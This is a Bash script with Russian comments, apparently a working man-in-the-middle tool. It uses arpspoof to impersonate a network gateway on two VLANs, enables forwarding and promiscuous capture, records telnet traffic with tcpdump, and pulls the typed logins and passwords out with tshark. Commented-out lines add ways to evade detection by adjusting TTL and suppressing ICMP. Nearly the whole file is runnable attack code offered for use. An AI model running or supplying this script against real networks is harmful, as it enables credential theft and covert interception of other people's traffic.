#!/bin/bash
#Читатьт arp_spoofing.txt.
#Скрипт для перехвата telnet login-а и пароля через проходящий через GW, притворяемся шлюзом.
[ "$UID" = "0" ] || { echo "Нужны права root." && exit 1;}
dpkg-query -s dsniff &>/dev/null || { echo "Не установлен dsniff(arpspoff)" && exit 1;}
dpkg-query -s tshark &>/dev/null || { echo "Не установлен tshark" && exit 1;}
dpkg-query -s tcpdump &>/dev/null || { echo "Не установлен tcpdump" && exit 1;}

eth1=eth1
ether1_vlan=10
ipaddr1="172.19.1.13/21"
ipforward1="172.19.0.0/21"
ipatac1="172.19.0.13/32"
ipgw1="172.19.0.1"

eth2=eth1
ether2_vlan=113
ipaddr2="192.168.33.13/24"
ipforward2="192.168.33.0/24"
ipatac2="192.168.33.10/32"
ipgw2="192.168.33.1"



tcpdump_file=/tmp/`(basename $0)`.cap
rm $tcpdump_file

#Удалениеправил iptables но не удаление итнтерфейсов для форвардинга.
if [ "$1" = "del" ]
   then
     iptables -t filter -D FORWARD -s $ipatac1 -j ACCEPT
     iptables -t filter -D FORWARD -s $ipatac2 -j ACCEPT

     sysctl -w net.ipv4.ip_forward=0
   exit 0
fi



ip link add link eth1 name $eth1.$ether1_vlan type vlan id $ether1_vlan
ip link set $eth1.$ether1_vlan up
ip link add link eth1 name $eth2.$ether2_vlan type vlan id $ether2_vlan
ip link set $eth2.$ether2_vlan up

ip add add $ipaddr1 dev $eth1.$ether1_vlan
ip add add $ipaddr2 dev $eth2.$ether2_vlan

ip link set $eth1.$ether1_vlan promisc on
ip link set $eth2.$ether2_vlan promisc on



#Так как мы заменяем маршрутизатор, мы должны быть в одной подсети с атакующими и они быть в arp таблице.
ip route add $ipatac1 dev $eth1.$ether1_vlan
ip route chan $ipatac1 dev $eth1.$ether1_vlan
ip route add $ipatac2 dev $eth2.$ether2_vlan
ip route chan $ipatac2 dev $eth2.$ether2_vlan

iptables -t filter -I FORWARD 1 -s $ipforward1 -j ACCEPT
iptables -t filter -I FORWARD 1 -s $ipforward2 -j ACCEPT
sysctl -w net.ipv4.ip_forward=1


#Запрещаем redirect icmp (предлогать лучший путь).
#iptables -A OUTPUT -o $eth1.$ether1_vlan -p icmp --icmp-type 11 -j DROP
#iptables -A OUTPUT -o $eth2.$ether2_vlan -p icmp --icmp-type 11 -j DROP

#Для того что бы наш маршрутизатор не уменьщал ttl(прибовлял +1) и по traceroute-у нас не заметил.
#iptables -t mangle -A PREROUTING -i $eth1.$ether1_vlan -j TTL --ttl-inc 1
#iptables -t mangle -A PREROUTING -i $eth2.$ether2_vlan -j TTL --ttl-inc 1


arpspoof -i $eth1.$ether1_vlan -t `(echo $ipatac1 | sed 's/\/.*//g')` -r $ipgw1 2>/dev/null &
fon_proc_arpspoof_1=$!
arpspoof -i $eth2.$ether2_vlan -t `(echo $ipatac2 | sed 's/\/.*//g')` -r $ipgw2 2>/dev/null &
fon_proc_arpspoof_2=$!
tcpdump -i $eth2.$ether2_vlan port 23 and src net $ipatac2 and dst net $ipatac1 -w $tcpdump_file &>/dev/null  &
fon_proc_tcpdump=$!

#echo $fon_proc_arpspoof_1 $fon_proc_arpspoof_2

#Посылаем  SIGINT, тот же что и при нажатии ctrl-c, и arpspoof должен вернуть всё на свои места pc атакуемым(arp).
trap ctrl_c INT

function ctrl_c() {
echo "Завершение...."
kill -2 "$fon_proc_tcpdump"
kill -2 "$fon_proc_arpspoof_1" &
kill -2 "$fon_proc_arpspoof_2" &
sleep 5
echo "Данные переданные по telnet от $ipatac2($eth1.$ether2_vlan)  на  $ipatac1($eth1.$ether1_vlan)...."
su dima -c "tshark -r "$tcpdump_file" -Y \"ip.dst == "$ipatac1"\" -O telnet | grep Data: | sed 's/\\\r/new_line/g' | sed 's/.*Data: //g' | tr '\n' '\ '| sed 's/\ *new_line\ */\n/g'"
exit 0
}

echo "Пойманные telnet пакеты:"
while true
 do
   echo -en "`(su dima -c "tshark -r "$tcpdump_file" -Y "telnet" | wc -l")`"
   sleep 1
   tput hpa 0
 done
